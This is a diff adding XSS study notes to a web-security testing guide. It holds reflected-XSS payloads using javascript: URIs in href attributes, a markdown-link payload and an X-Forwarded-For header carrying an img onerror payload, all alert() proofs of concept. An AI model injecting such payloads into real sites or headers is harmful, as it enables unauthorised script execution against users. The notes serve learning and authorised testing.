@@ -100,3 +100,36 @@ https://www.yougetsignal.com/tools/web-sites-on-web-server/
 
 ## Ch3 - XSS
 
+### Reflected
+
+Check if these characters are permitted `"'<>();[]{}AbC`
+
+XSS in href attribute
+```
+javascript:alert(1)
+javascript://%0d%0aalert(1);
+javascript://%0d%0aalert(1);//http://derp.com
+javascript://%0d%0alert(1);//.com
+```
+
+Correct values for JSON responses are typically `text/javascript` or `application/json` if your value is being reflected and if you get `text/html` try for an XSS.
+
+### Stored
+
+Markdown
+```
+[Hi](javascript:alert(1);)
+```
+Spoofed IP address
+- Use the `X-Forwarded-For` header (used by HTTP proxies)
+- `X-Forwarded-For: "><img src=x onerror=alert(0);>`
+
+### Resources
+- http://html5sec.org
+- https://www.blueclosure.com/
+- https://code.google.com/archive/p/domxsswiki/wikis/Introduction.wiki
+
+## Ch4 - CSRF
+
+
+
